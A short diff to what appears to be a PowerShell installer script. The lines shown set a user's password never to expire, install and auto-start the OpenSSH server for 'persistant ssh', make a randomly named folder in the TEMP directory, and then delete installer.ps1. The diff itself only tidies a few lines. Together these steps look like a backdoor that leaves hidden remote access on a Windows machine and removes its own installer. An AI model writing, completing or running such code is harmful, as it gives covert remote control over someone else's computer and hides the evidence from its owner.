@@ -36,19 +36,16 @@ Write-Host "Ensuring password for $Username never expires."
 # goto temp
 $wd = random_text
 $path = "$env:TEMP/$wd"
-$initial_dir = %cd%
 
 # enabling persistant ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
-pause
 # make working directory
 cd $path
 mkdir $path
 
-cd $initial_dir
 try {
     del installer.ps1 -ErrorAction Stop
     Write-Host "File 'installer.ps1' deleted successfully."
